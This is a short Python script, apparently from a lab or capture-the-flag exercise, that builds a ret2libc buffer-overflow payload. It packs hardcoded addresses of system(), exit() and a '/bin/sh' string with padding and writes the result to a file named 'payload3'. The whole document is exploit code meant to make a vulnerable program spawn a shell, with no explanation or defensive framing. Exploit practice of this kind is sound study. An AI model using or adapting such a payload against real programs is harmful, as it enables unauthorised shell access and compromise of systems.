import struct

# Addresses of system(), exit(), and "/bin/sh" string
system_addr = struct.pack("<Q", 0x7FFFF7A31420)
exit_addr = struct.pack("<Q", 0x7FFFF7A25110)
binsh_addr = struct.pack("<Q", 0x7FFFF7B95D88)

# Return address to system() function
ret_addr = system_addr

# Arguments to system() function
arg1 = binsh_addr
# Padding to overflow the buffer
padding = b'A' * 44 + exit_addr + b'A' * 20 + arg1 + b'A' * 8


# Build payload
payload = padding + ret_addr

# Write payload to file
with open("payload3", "wb") as f:
    f.write(payload)

